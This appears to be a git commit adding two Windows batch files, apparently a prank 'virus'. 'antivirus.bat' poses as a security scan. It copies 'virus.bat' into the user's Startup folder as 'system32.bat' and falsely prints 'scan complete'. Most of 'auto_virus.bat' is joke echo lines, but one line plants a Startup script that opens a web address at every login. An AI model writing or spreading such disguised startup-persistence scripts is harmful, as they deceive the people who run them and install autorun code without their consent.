962aadeeecf5dc18f1869cc2464a5f93f1328447
talhaasghar <talhaasghar220@gmail.com>
2021-01-13 15:54:02 +0500

    Initial Commit

---
+++ antivirus.bat
@@ -0,0 +1,2 @@
+copy "virus.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\system32.bat"
+echo scan complete
---
+++ auto_virus.bat
@@ -0,0 +1,19 @@
+echo Talha is the Best Programmer in this world.
+echo Do you agree?
+echo Don`t u?
+echo I see you agreed.
+echo That is like a good guy.
+echo open This PC
+echo start hacking...
+echo open cmd
+echo uninstall everything...
+echo done!
+echo do secret task...
+echo done!
+echo save fiverr.inbox
+echo start on system run
+echo start http://example.com/ > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\system.bat"
+echo scan complete
+echo save everything
+echo close database
+echo close files
